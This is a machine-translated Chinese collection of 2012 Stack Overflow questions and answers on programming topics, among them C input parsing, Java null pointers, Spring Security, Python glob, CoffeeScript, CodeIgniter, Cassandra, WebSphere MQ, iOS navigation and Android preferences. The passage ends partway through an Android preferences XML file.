> 时间：2012-04-13T21:13:38.203

VBA 仅作为嵌入在 Excel 等主机应用程序中的“宏语言”存在。曾经您甚至可以购买 SDK 将 VBA 嵌入您自己的应用程序中，但从来没有任何“独立 VBA”。

VBScript 在语法和语义上接近 VBA 和 VB，但它也需要宿主。常见的桌面主机包括 WSH、MSHTA 和 Vista/Win7“小工具”框架。如果它满足您的需求，那可能是您最好的选择。

如果可以找到它，则可以使用 VB5CCE（控制创建版）远程执行您想要的操作。这是免费的，但无法编译为 EXE。它可能作为解释器工作，但是通过使用`/run`开关运行它。不过我不确定。

还有第 3 方免费赠品，例如[Jabaco](http://www.jabaco.org/)，它使用非常类似于 VB/VBA 的语法。

更新：VB5CCE*不*支持`/run`开关。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-15T02:56:56.150

如果 VB.NET 适合的话，这可能值得一看。Visual Studio Express ...我不确定免费版本遗漏了什么。

[http://www.microsoft.com/visualstudio/en-us/products/2010-editions/visual-basic-express](http://www.microsoft.com/visualstudio/en-us/products/2010-editions/visual-basic-express)

# c - ANSI C - 如何逐字读取标准输入？

> ID：10148186
> 
> 赞同：4
> 
> 时间：2012-04-13T20:54:15.960
> 
> 标签：c

代码：

```
#include <stdio.h>
int main(void) {
    char i[50];
    while(scanf("%s ", i)){
        printf("You've written: %s \n", i);
    }
    printf("you have finished writing\n");

    return 0;
} 
```

一个问题是代码没有按预期执行。如果我输入：

```
abc def ghi. 
```

它会输出：

```
You've written: abc
You've written: def 
```

我该如何解决？目标是从标准输入读取每个单词，直到它到达“ENTER”或“。” （点）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-13T21:02:27.237

@cnicutar 非常接近，但是您显然只想从空白以外的地方开始阅读，并且想在到达空白时停止阅读单个单词，因此对于您的扫描集，您可能想要更多类似的东西：

```
while(scanf(" %49[^ \t.\n]%*c", i)) { 
```

在这种情况下，初始空格会跳过任何前导空格。然后扫描集读取，直到它到达空格、制表符、换行符或句点。然后 %*c 读取（但丢弃）下一个字符（通常是停止扫描的那个）。

但是，当/如果您到达缓冲区的末尾时，这可能会丢弃一个字符，因此您可能想要使用 %c，并提供一个要读入的字符。这将使您从一个比您提供的缓冲区更长的单词中恢复。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-13T20:57:51.340

怎么样：

```
scanf("%49[ ^\n.]", str) 
```

或类似的东西。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-13T22:20:35.300

完全`scanf`放弃并使用`fgets`：

```
while (fgets(i, sizeof i, stdin))
{
  printf("you've written: %s\n", i);
} 
```

有以下注意事项：

1.  如果目标缓冲区中有空间，`fgets`则将尾随换行符存储为输入的一部分；

2.  如果您想停止阅读查找 a `.`，则必须添加一些逻辑以在输入字符串中查找它，例如：

```
 int foundDot = 0;
    while (fgets(i, sizeof i, stdin) && !foundDot)
    { 
      char *dot = strchr(i, '.');
      char *newline = strchr(i, '\n');

      if (dot != NULL)
      {
        foundDot = 1;
        *dot = 0; // overwrite the '.' character with the 0 terminator
      }

      if (newline != NULL)
      {
        *newline = 0; // overwrite newline character with 0 terminator
      }

      /**
       * Assuming you don't want to print a blank line if you find a dot
       * all by itself. 
       */
      if (strlen(i) > 0) 
        printf("you've written: %s\n", i);
    }
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-04-13T20:56:39.317

最简单的方法是使用[flex](http://westes.github.io/flex/manual/)。否则，您将重复一堆困难、复杂的工作，并且很可能会犯错误。

另外，请阅读[lex and yacc, 2nd edition](http://shop.oreilly.com/product/9781565920002.do)。

# c++ - C++ windows dll 查看器

> ID：10148193
> 
> 赞同：5
> 
> 时间：2012-04-13T20:54:59.877
> 
> 标签：c++, windows, dll

我想在 C++ 中模拟一个非托管的 dll。有什么好的工具可以打开和查看它的界面吗？

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-13T20:55:53.070

最常用的工具是[Dependency Walker](http://dependencywalker.com/)。这显示了导出符号的列表。

但是，它没有显示函数原型，因为它们不包含在 DLL 元数据中。要获取该信息，您需要 DLL 的头文件。此语句的例外是包含带有类型库的 COM/ActiveX 组件的 DLL。

即使您有原型，也不足以知道如何模拟 DLL。您需要 DLL 的完整文档。然后你可能还有很多逆向工程要做。

# java - 空指针错误？

> ID：10148194
> 
> 赞同：0
> 
> 时间：2012-04-13T20:54:59.533
> 
> 标签：java, nullpointerexception, dialog

我正在制作一个游戏，我有几个不同的课程，因为我不喜欢把所有东西都放在一个里面。我有一个 GameView 类和一个玩家类。问题是我正在从 GameView 调用玩家类中的方法。但它给了我一个空指针错误。下面是我的代码：

GameVie 类：

```
Panel p2 = new Panel();
p2.setLayout(new BorderLayout());
JLabel player1Lbl = new JLabel("Player 1");
p2.add(player1Lbl, BorderLayout.WEST);
player.enterNameP1(); //Having an error here.
player1Lbl.setText(player.enterNameP1()); 
```

球员等级：

```
public class Players
{
    //storing the player 1 name
    private String p1name;
    //storing the player 2 name
    private String p2name;

    /**
     * Constructor for objects of class Players
     */
    public Players()
    {
        this.p1name = p1name;
        this.p2name = p2name;
    }

    /**
     *Enter the player 1 name in a dialog box
     */
    public String enterNameP1() //It was public void before but it wasnt accepting a void method in the gameView so I changed it to String
    {
        this.p1name = JOptionPane.showInputDialog("Please enter player 1 name","Specify name");
        return p1name;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T20:56:41.930

你应该先初始化播放器.....？

```
Players player = new Players(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-13T20:56:49.117

在您调用时，您的播放器未初始化：

```
player.enterNameP1(); //Having an error here. 
```

要解决这个问题，您必须确保引用`player`实际上指向 Player 的真实实例。这应该通过在代码中的逻辑位置添加以下内容来完成：

```
player = new Players(); 
```

这就是您得到 NullPointerException 的原因。当您从特定对象调用方法时，必须初始化该对象（这意味着指针`player`指向该类的实际实例`Players`）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T20:57:28.830

你没有实例化**播放器** 所以它是**null**导致 NPE

# java - Spring Security form-login属性的动态配置

> ID：10148199
> 
> 赞同：0
> 
> 时间：2012-04-13T20:55:29.280
> 
> 标签：java, spring, spring-mvc, spring-security

使用表单登录进行身份验证。我需要能够从用于配置应用程序其他方面的数据库表中配置失败 URL 和成功 URL。

我对用户进行身份验证的应用程序链接到可能位于此服务器或另一台服务器上的不同应用程序，我需要在用户注销时故障返回或转到那里。

```
 <form-login authentication-success-handler-ref="authenticationSuccessHandler"
                    always-use-default-target="true"
                    authentication-failure-url="**/failureurl.aspx**"
                    default-target-url="/home/configuration"/>
<logout logout-success-url="**/successurl.aspx**" invalidate-session="true"/> 
```

我将如何即时更改这些属性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:06:17.110

我不认为你可以动态配置它们——你最好指向读取数据库属性的控制器方法，然后重定向到适当的页面。

```
@RequestMapping(value = {"", "/", "/index"}, method = RequestMethod.GET)
public ModelAndView redirectToHomepage(HttpServletRequest request) {
    // If not logged in, then go to the landing page.
    if (request.getUserPrincipal() == null) {
        return new ModelAndView("redirect:/");
    }

    if (request.isUserInRole("ROLE_ADMIN")) {
        return new ModelAndView("redirect:/admin");
    }
    return new ModelAndView("redirect:/dashboard");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:07:31.433

听起来你有逻辑处理来确定用户实际登陆的位置。如果我是你，我会将你的属性连接到另一个控制器，该控制器根据你的规则处理请求并从那里进行重定向。

```
<form-login authentication-success-handler-ref="authenticationSuccessHandler"
                always-use-default-target="true"
                authentication-failure-url="/redirect/failure"
                default-target-url="/home/configuration"/> 
```

进而：

```
@Controller
@RequestMapping("/redirect/failure")
public class Redirector
{
    public String doFailureRedirection(HttpServletRequest request, Model model)
    {
          //check where user is supposed to go and return
    }
} 
```

# python - 占glob中的小写和大写

> ID：10148215
> 
> 赞同：2
> 
> 时间：2012-04-13T20:57:11.447
> 
> 标签：python

我需要将扩展​​名传递给函数，然后让该函数以小写和大写形式提取具有该扩展名的所有文件。

例如，如果我通过了`mov`，我需要执行以下操作：

```
videos = [file for file in glob.glob(os.path.join(dir, '*.[mM][oO][vV]'))] 
```

给定小写输入，我将如何完成上面的小写+大写组合？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-13T21:02:35.743

像这样的东西？

```
>>> def foo(extension):
...     return '*.' + ''.join('[%s%s]' % (e.lower(), e.upper()) for e in extension)
... 
>>> foo('mov')
'*.[mM][oO][vV]' 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-13T21:00:37.970

由于[glob](http://docs.python.org/library/glob.html)只是调用`os.listdir`and `fnmatch.fnmatch`，所以你可以调用`listdir`自己，并进行自己的匹配。如果您正在寻找的只是一个匹配的扩展，这是一个非常简单的测试，并且应该不难写成正则表达式或使用`[-3:]`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:04:52.763

您可以轻松地在大写和小写之间转换字符串：

```
>>> ext = 'mov'
>>> ext.upper()
'MOV' 
```

所以只需在你的函数中使用它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T21:52:04.833

如果您在 Unix 上运行它，您可以尝试调用它：

```
from subprocess import Popen, PIPE

#replace the "/tmp/test/" and "*.test" with your search path and extension
args = ["find", "/tmp/test/", "-iname", "*.test"]
files = Popen(args, stdout=PIPE).stdout.readlines()

>>> files
['/tmp/test/a.Test\n', '/tmp/test/a.TEST\n', '/tmp/test/a.TeST\n', '/tmp/test/a.test\n'] 
```

[有关子流程的更多详细信息](http://docs.python.org/library/subprocess.html)

# nested - j+=sqrt(i) 时的时间复杂度

> ID：10148221
> 
> 赞同：3
> 
> 时间：2012-04-13T20:57:58.187
> 
> 标签：nested, complexity-theory, sqrt

我需要找到这个函数的时间复杂度（以 theta 为单位）：

```
int x = 0; 
for (int i=1; i < n ; i++) { 
  for (double j=i; j <= n ; j+=sqrt(i)) { 
    ++x; 
  } 
} 
```

我知道外循环进行 n-1 次迭代，而内循环进行 (ni)/sqrt(i) 迭代，所以我需要计算 i=1 到 (ni)/sqrt(i) 的 n-1 的 sigma。知道怎么做吗？

编辑：假设 sqrt() 在 O(1) 中运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:17:31.397

我不知道 sigma 和 theta 是什么意思，但是 sqrt 是一个常数时间运算，所以它在大 O 表示法中基本上没有关系，即 j+=sqrt(i); 与 j+=i 相同；与 j+=1; 相同。另外 (nk) ~= n 代表 k 远小于 n。这意味着当 n 变大时，ni 就是 n。所以 (ni) * sqrt() = n * 1 = n。你为外循环做了 n 次，所以 n^2。

**添加：** 至于你的复杂系列，我相信这是准确的，但这不是我们关心的，我们关心的是操作的顺序。所以我们需要证明你的系列是 O(n^2) 或 K*n^2。所以你有 i + 2*i + ... (n-1)*i + n*i。其中 i 是常数，因此我们可以将其分解并包含在 K 中，并留下 1 + ... + n。该语句由 n 主导，即当 n 变大时 n ~= (n-1) 和 (n-1) ~= (n-2)，这意味着 (n-2) ~= n。现在，当我们接近零时，这并不成立，但是 n 太大了，我们可以删除第一个说百万项。所以我们留下了一些看起来像 C*(nk)*n + c 的函数。其中 C、k 和 c 都是常数。由于我们不关心常量，我们只关心随着 n 的增长而增长，我们可以删除所有这些常量并只保存 n^2。或者，您可以证明您的系列以 n^k*n 为界，其中随着 n 接近无穷大，k 变为 1，但一个好的逻辑论证通常更好。〜本

# php - PHP 问题“致命错误：在非对象上调用成员函数 Save()”

> ID：10148227
> 
> 赞同：0
> 
> 时间：2012-04-13T20:58:28.877
> 
> 标签：php, class, mysqli

我收到此错误“致命错误：在第 140 行的非对象上调用成员函数 Save()”

在 PHP 编辑器中就像

```
$imageObj = split & new Image($row_image);
$imageObj->Save(); 
```

请帮助解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:05:59.093

这个“分裂”是`$imageObj = split & new Image($row_image);`什么？

尝试将其更改为`$imageObj = new Image($row_image);`或解释它的用途

# sinatra - 西纳特拉咖啡脚本--bare？

> ID：10148228
> 
> 赞同：0
> 
> 时间：2012-04-13T20:58:35.160
> 
> 标签：sinatra, coffeescript

我已经对此进行了一些搜索，但找不到信息。我正在 sinatra 中构建一个应用程序，并使用 coffeescript 模板引擎。默认情况下，编译后的代码是这样包装的：

```
(function() {
  // code
}).call(this); 
```

我想使用 --bare 标志删除它，以便不同的文件可以访问我正在定义的类等。我意识到包含更多内容有助于防止变量冲突等，但我正在研究两个主要部分。一是业务逻辑，以及类结构中的数据排列。另一个是使用 raphaeljs 的视图功能。我宁愿将这两部分保存在单独的文件中。由于这样包装的两个文件无法访问数据，因此显然无法正常工作。但是，如果您能想到比使用 --bare 选项更好的解决方案，我会全力以赴。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:10:28.293

裸编译只是一种不好的做法。每个文件都应仅将与应用程序其余部分相关的公共对象导出到全局范围。

```
# foo.coffee
class Foo
  constructor: (@abc) ->

privateVar = 123

window.Foo = Foo # export 
```

`Foo`现在全球可用。现在，如果该模式不实用，也许您应该重新考虑一下您的结构。如果你必须导出太多东西，你可以更好地嵌套和命名空间，这样可以通过更少的全局变量暴露更多的数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-14T01:55:00.077

我支持亚历克斯的回答，但如果你绝对必须这样做，我相信[我对 Rails 3.1 相同问题的回答](https://stackoverflow.com/a/6099872/66226)也适用于此处：

```
Tilt::CoffeeScriptTemplate.default_bare = true 
```

在你的应用程序的某个地方。

# javascript - 如何标记 -webkit-transform-origin 的位置？

> ID：10148230
> 
> 赞同：0
> 
> 时间：2012-04-13T20:58:46.130
> 
> 标签：javascript, css, css-animations

我正在使用 CSS3 创建 CSS 动画。我正在使用 rotateX 旋转图像。我想以某种方式标记原点的位置，以便我可以准确地看到旋转点的位置。

如何标记 -webkit-transform-origin 的位置？我对任何解决方案、CSS 或 JavaScript 持开放态度。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:57:17.867

在我正在使用的 chrome 版本（版本 18）中，`-webkit-transformation-origin`任何元素的最初始终是元素的中心，**相**对于该元素，两个坐标都是下限的。因此，如果

`element.style.webkitTransformationOrigin`

是一个空字符串，那么它将是

`Math.floor(element.width/2) + "px " + Math.floor(element.height/2) + " px"`.

如果它不是空字符串，那么它将采用该格式，`[x]px [y]px`两个坐标之间有一个空格。如果需要，您可以使用正则表达式提取值，例如在您的情况下，并且由于该值是相对于元素的，因此您必须获取页面上元素的绝对位置并将原点添加到以获得您的原点的绝对位置。

# php - CodeIgniter - 在多站点设置中扩展本机库

> ID：10148231
> 
> 赞同：2
> 
> 时间：2012-04-13T20:58:46.583
> 
> 标签：php, codeigniter, validation, native

我想为多个站点使用中央 CI 设置。我处理这个问题的方法是我创建了一个名为 MPACK 的包，并将它添加到每个站点的配置文件中的自动加载中。

**文件夹结构：**

> /主要的
> 
> > /system（CI 2 系统文件夹）
> > 
> > /MPACK
> 
> /site1
> 
> > /应用
> 
> 站点2
> 
> > /应用

在这个 MPACK 中，我有共享库、模型、助手等。

但是，我想要一个扩展的 MY_Form_Validation 对所有站点都是通用的。将类文件添加到 /MPACK/libraries 失败。正如预期的那样，将其添加到 /site1/application 可以正常工作。

有没有办法在 MPACK 内部扩展？

感谢您的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T19:14:32.383

请试试这个：

```
// Placed your MY_Form_validation.php under MPACK/libraries
$this->load->add_package_path('/path/to/MPACK');
$this->load->library('form_validation'); 
```

[您可以从CodeIgniter User Guide - Loader Class](http://codeigniter.com/user_guide/libraries/loader.html)获得更多信息。:)

您还可以在以下位置自动加载您的包`/application/config/autoload.php`：`$autoload['packages'] = array('/path/to/MPACK');`

**编辑**：结果上面的解决方案不起作用，因为 Loader 总是首先寻找 APPPATH 和 BASEPATH，我不确定修改这个核心类不会破坏某些东西。这是理论上的另一种解决方案：

您应该拥有 MPACK 表单验证库，并且站点的表单验证库应该是 MPACK 的符号链接：

```
/site1/application/MY_Form_validation.php -> /MPACK/libraries/MY_Form_validation.php 
```

如果您只使用 MPACK 中的所有内容，没有专门针对 /site1 或 /site2 的内容，只需创建一个文件夹链接：

```
/site1/application/libraries/ -> /MPACK/application/libraries/ 
```

希望这有帮助=)

你可以在这里阅读更多：http: [//codeigniter.com/wiki/Multiple_Applications_via_Symlinks/](http://codeigniter.com/wiki/Multiple_Applications_via_Symlinks/)

# cassandra - Cassandra CLI：指定主键的名称

> ID：10148234
> 
> 赞同：5
> 
> 时间：2012-04-13T20:59:03.260
> 
> 标签：cassandra, cql

是否可以通过 cassandra CLI 指定主键的名称，例如通过 CQL：

```
create columnfamily test (
  my_key_name varchar primary key,
  value varchar); 
```

默认情况下，cassandra cli 创建名为“KEY”的主键

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-17T03:19:59.247

您要查找的属性是`key_alias`. 不幸的是，您目前无法通过 cassandra-cli 进行设置，只能通过 cqlsh 进行设置。我已经打开[CASSANDRA-4158](https://issues.apache.org/jira/browse/CASSANDRA-4158)来解决这个问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-16T15:29:55.210

通过 CLI 创建或更新列族时，您可以指定 column_metadata 以识别类型（验证类）和/或列是否具有索引。例如，假设您已经创建了**测试**列族，并希望将列**my_key_name**指定为索引的字符串类型：

```
update column family test
 with column_metadata =
  [
   {column_name: 'my_key_name', validation_class: UTF8Type, index_type: KEYS}
  ]; 
```

如果您想稍后删除索引

```
update column family test with column_metadata = []; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-14T11:29:41.483

[这是 Datastax 网站http://www.datastax.com/dev/blog/schema-in-cassandra-1-1](http://www.datastax.com/dev/blog/schema-in-cassandra-1-1)上与 Cassandra 1.1 模式相关的博客文章中的 CQL 示例

```
CREATE TABLE users (
    id uuid PRIMARY KEY,
    name varchar,
    state varchar
); 
```

我只使用了 0.7.x，您可以在其中指定键的数据类型。以下来自 0.7.6 cassandra-cli “帮助假设；” 命令

```
assume <column_family> keys as <type>;

Assume one of the attributes (comparator, sub_comparator, validator or keys)
of the given column family to match specified type. Available types: bytes, integer, long, lexicaluuid, timeuuid, utf8, ascii. 
```

# ibm-mq - 使用 WCF 时确保消息的持久性

> ID：10148236
> 
> 赞同：2
> 
> 时间：2012-04-13T20:59:14.503
> 
> 标签：ibm-mq

我想知道在使用 websphere MQ 和 WCF 时如何确保消息的持久性。我希望能够让我的 WCF 进程从队列中挑选消息，并且如果应用程序遇到问题（停电等），我不会丢失消息。如果可能的话，我也希望不必使用事务，因为我想消除分布式事务。

谢谢，

小号

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:35:46.860

嗯，有交易，也有分布式交易。“正确”的答案是在这里使用 WMQ 1-phase commit。这没有 XA 事务的复杂性，但它确实使您能够回滚消息而不会丢失它。事实上，在使用客户端时，您确实应该使用至少 1 阶段提交，以防止消息丢失。

除此之外，总是有“带锁浏览，光标下删除消息”的方法。我很确定您需要进行浏览、锁定和删除的所有操作都暴露在 .NET 下，但也许 Shashi 会发表评论和确认。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-14T05:12:24.127

WebSphere MQ WCF 自定义通道具有“保证交付”功能，可确保服务请求或回复被执行且不会丢失。这是 1 阶段提交（也称为 SYNC_POINT in）WMQ。

“保证交付”是服务合同属性。[以下](http://publib.boulder.ibm.com/infocenter/wmqv7/v7r0/topic/com.ibm.mq.csqzav.doc/un12400_.htm)是有关该功能的更多详细信息。

# iphone - 转到应用程序中的第一个视图控制器

> ID：10148244
> 
> 赞同：6
> 
> 时间：2012-04-13T20:59:52.313
> 
> 标签：iphone, ios, xcode, uinavigationcontroller

我需要转到我的应用程序中的第一个视图。我有一些视图被推送到堆栈上，然后是一个模态导航控制器，还有更多视图被推送到它上面。

我遇到的问题是 using`[[self navigationController] popToRootViewControllerAnimated:YES];`只能回到模态堆栈中的第一个视图。

而且我无法开始`[[self navigationController] popToViewController:..`工作，因为真正的第一个视图控制器无法使用`[[self navigationController] viewControllers]`.

关于如何做到这一点的任何想法？谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-13T21:16:37.733

做这个：

```
[[self navigationController] dismissModalViewControllerAnimated:YES]; 
```

这将使您回到模态显示导航控制器的 VC。在那之后更远的地方取决于你如何在导航控制器之前推送那些“少数视图”。

**编辑**- 解释到最深的根源......

听起来那些“少数视图”在另一个底层导航控制器的堆栈上。这可能有点棘手，因为在该堆栈中返回更远的干净方法是让底层导航控制器弹出到它自己的根目录。但是它怎么知道它上面的模态VC已经完成了呢？

让我们称做第二个导航控制器 VC_a 的模态表示的视图控制器。它是一个模态呈现的导航控制器，其最顶层的 VC 是 VC_b。当 VC_b 模态关闭自身时，VC_a 如何知道弹出到它的导航根目录？

好的答案（通常）是 VC_b 出于某种原因决定自行解散 - 您的应用程序/模型中的某些条件已更改以使其决定完成。

我们也希望 VC_a 检测到这种情况。当 VC_b 被解雇，并且 VC_a 收到 viewWillAppear 消息，因为它即将被揭露：

```
// VC_a.m

- (void)viewWillAppear:(BOOL)animated {

    [super viewWillAppear:animated];
    if (/* some app condition that's true when VC_b is done */) {
        // I must be appearing because VC_b is done, and I'm being uncovered
        // That means I'm done, too.  So pop...
        [self.navigationController popToRootViewControllerAnimated:NO];
    } else {
        // I must be appearing for the normal reason, because I was just pushed onto the stack
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:35:43.570

您需要使用[委托模式](http://en.wikipedia.org/wiki/Delegation_pattern)来做到这一点。具体来说，通过创建一个实现委托`respondsToSelector`方法的协议。

有关完整的详细信息，请参阅[此帖子](https://stackoverflow.com/questions/8108422/how-do-you-pop-a-modal-view-and-the-previous-navigation-controller-view-at-once/8146373#8146373)。它应该几乎正是您正在寻找的。我必须做类似的事情，除了我只需要从导航堆栈中弹出一个视图而不是使用`popToRootViewControllerAnimated:`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-14T12:30:35.200

在 AppDelegate.m 类中创建具有波纹管流程的方法...

```
-(void)MethodName{//your method name
    YourViewController *objViewController = [[[YourViewController alloc] initWithNibName:@"YourViewController" bundle:nil] autorelease]; ///define your viewcontroller name like "FirstViewController" 
    UINavigationController *yourNavigationController = [[[UINavigationController alloc] initWithRootViewController:objViewController] autorelease];

    self.window.rootViewController = yourNavigationController;
} 
```

当您想在 firstview 上重定向时，只需从 appdelegate 对象调用此方法....

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-08-18T22:15:50.910

对于 iOS6...

```
[self.view.window.rootViewController dismissViewControllerAnimated:YES completion:nil]; 
```

# jquery - 有没有这样的 jquery 工具可用？

> ID：10148247
> 
> 赞同：4
> 
> 时间：2012-04-13T21:00:12.153
> 
> 标签：jquery, image

我需要为客户的网站“构建”图像。将有一个核心图像，然后将堆叠在其顶部的其他几个可互换图像。

因此，在网站的管理部分，用户将能够查看核心图像并单击它来设置点（我们称之为注册点），这些点将设置当最终图像出现时其他图像的显示位置建成。

只是想知道是否有人做过类似的事情，或者是否有某种 jquery 工具可以真正帮助我完成这个。

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-14T16:07:14.340

找不到适合您的，所以您必须自己构建它。

我在这里做了一个小演示，管理员可以点击地图并使用 html5 画布插入标记。

您需要做的其他事情是存储数据并将其作为 json 数组提供给实时页面。

[http://jsfiddle.net/QLT4v/](http://jsfiddle.net/QLT4v/)

有一些松散的结局，但请注意顶部图像的点击如何由底部地图上的标志表示。中间的文本框包含您需要存储和呈现的数据。

希望它为您指明解决方案

编辑：

更新版本显示了使用绝对定位 div 的解决方案。注意父 div 上的 position:relative 。可能是什么导致您的管理部分出现问题。

缺点：没有一张图片.. 优点：没有一张图片->易于将悬停/点击等功能附加到项目

[http://jsfiddle.net/QLT4v/1/](http://jsfiddle.net/QLT4v/1/)

# android - 离开PreferenceActivity，调用Activity还是读取旧的preference？

> ID：10148248
> 
> 赞同：1
> 
> 时间：2012-04-13T21:00:19.267
> 
> 标签：android, sharedpreferences

我觉得我遗漏了一些明显的东西，但搜索让我找到了几个不同的点击，所有这些都没有直接访问我的奇怪问题。

拥有一个具有主要活动和偏好活动的应用程序。添加一个“偏好”类，它简化了阅读和设置偏好。主要活动有一个选项菜单可以访问偏好活动：

首选项类（包括相关性，如果我不使用此类来读取设置，也会发生同样的事情）。

```
public class Preferences
{
    public static SharedPreferences getPrefs(Context context)
    {
        SharedPreferences retCont = PreferenceManager.getDefaultSharedPreferences(context);
        return retCont;
    }

    /* Map Page: Show Satellite */
    public static boolean getMapShowSatellite(Context context)
    {
        return Preferences.getPrefs(context).getBoolean(Preferences.getString(context, R.string.option_showSatellite), false);
    }

    public static void setMapShowSatellite(Context context, boolean newValue)
    {
        Editor prefsEditor = Preferences.getPrefs(context).edit();
        prefsEditor.putBoolean(Preferences.getString(context, R.string.option_showSatellite), newValue);
        prefsEditor.commit();
    }
} 
```

偏好活动：

```
public class AppSettings extends PreferenceActivity
{
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);

        addPreferencesFromResource(R.xml.app_preferences);

        ListPreference stationType = (ListPreference)this.findPreference(this.getString(R.string.option_filterStationType));
        stationType.setOnPreferenceChangeListener(this.stationOrderEnable());
    }
[...]
} 
```

最后两行连接一个事件以根据一个人的选择启用/禁用其他首选项。正如预期的那样，这有效。简单的主要活动，以及相关功能：

```
public class MainMapScreen extends MapActivity
{
    private void launchSettings()
    {
        Intent prefsIntent = new Intent(this.getApplicationContext(), AppSettings.class);
        this.startActivity(prefsIntent);
    }

    @Override
    protected void onResume()
    {
        super.onResume();

        Preferences.getMapShowSatellite(); // <-- Returns previous value.
        // Re-start the MyLocation Layer from tracking.
        this._mapView.requestLayout();
    }
[...]
} 
```

好的，那么会发生什么，假设我们运行应用程序。在应用程序加载时，`getMapShowSatellite()`返回`True`. 进入 PreferenceActivity，然后将该选项更改为`False`. 通过点击返回按钮退出 PreferenceActivity。此时，主活动`onResume()`被调用。此时获取 将`getMapShowSatellite()`返回先前的设置`True`。退出并重新启动应用程序最终将返回`False`预期的结果。

我没有`.commit()`手动调用 - 并且认为我不需要，因为设置正在保存，我只是没有得到更新值。

我错过了什么？：） - 狐狸。

**编辑 2：**小更新。我认为问题可能是静态调用 - 所以我暂时将我的 Preferences 类（上图）更改为实例化类，不再是静态的。我还在`onResume()`主要活动的调用中添加了以下代码：

```
//Try reloading preferences?
SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
String test = sp.getString(Preferences.OPTION_FILTERSTATIONTYPE, "---");
Log.e("BMMaps", test); 
```

从离开 PreferenceActivity 开始，此时记录的内容是旧设置。手动读取首选项文件显示 .xml 文件正在使用用户的新设置进行更新。

由于它不明显，我迷上了 Google 的 Maps API。因此，我必须指定两个不同的进程 - 一个用于主要活动（这个），另一个用于与此问题无关的活动。所有其他活动，包括 PreferencesActivity 都没有`android:process=""`在其定义中指定。

**编辑 3：** 根据要求，这是数据首选项文件：

```
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="com.tsqmadness.bmmaps.filterStationType">V-?</string>
    <boolean name="com.tsqmadness.bmmaps.deviceHasLocation" value="false" />
</map> 
```

这是首选项存储 XML 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android">
    <PreferenceCategory android:title="Map Options">
        <CheckBoxPreference android:key="com.tsqmadness.bmmaps.mapShowSatellite" android:order="1" android:summary="Whether or not to show satellite imagery on the map." android:summaryOff="Standard road map will be shown." android:summaryOn="Satellite imagery will be show." android:title="Show Satellite Layer?" />
        <CheckBoxPreference android:key="com.tsqmadness.bmmaps.mapShowScale" android:order="2" android:summary="Whether or not to show the distance bar on the map." android:summaryOff="The distance bar will not be shown on the map." android:summaryOn="The distance bar will be shown on the map." android:title="Show Map Scale?" />
        <CheckBoxPreference android:defaultValue="false" android:key="com.tsqmadness.bmmaps.useMetric" android:order="3" android:summary="Whether to use Metric os SI values." android:summaryOff="SI units (mi/ft) will be shown." android:summaryOn="Metric units (km/m) will be shown." android:title="Use Metric?" />
        <ListPreference android:dialogTitle="Station Load Delay" android:entries="@array/static_listDelayDisplay" android:entryValues="@array/static_listDelayValues" android:key="com.tsqmadness.bmmaps.mapBMDelay" android:negativeButtonText="Cancel" android:order="4" android:positiveButtonText="Save" android:summary="The delay after map panning before staions are loaded." android:title="Delay Before Loading" />
    </PreferenceCategory>
    <PreferenceCategory android:title="Control Station Filter">
        <ListPreference android:dialogTitle="Station Type" android:entries="@array/static_listStationTypeDisplay" android:entryValues="@array/static_listStationTypeValues" android:key="com.tsqmadness.bmmaps.filterStationType" android:negativeButtonText="Cancel" android:positiveButtonText="Save" android:summary="The station type to filter on." android:title="Station Type" android:order="1" />
        <ListPreference android:dialogTitle="Select Station Order" android:entries="@array/static_listStationHOrderDisplay" android:entryValues="@array/static_listStationHOrderValues" android:key="com.tsqmadness.bmmaps.filterStationOrder" android:negativeButtonText="Cancel" android:positiveButtonText="Save" android:summary="Station Order to filter by." android:title="Station Order" android:order="2" />
        <ListPreference android:dialogTitle="Select Station Stability" android:entries="@array/static_listStationStabilityDisplay" android:entryValues="@array/static_listStationStabilityValues" android:key="com.tsqmadness.bmmaps.filterStationStability" android:negativeButtonText="Cancel" android:positiveButtonText="Save" android:summary="Station stability to filter by." android:title="Station Stability" android:order="3" />
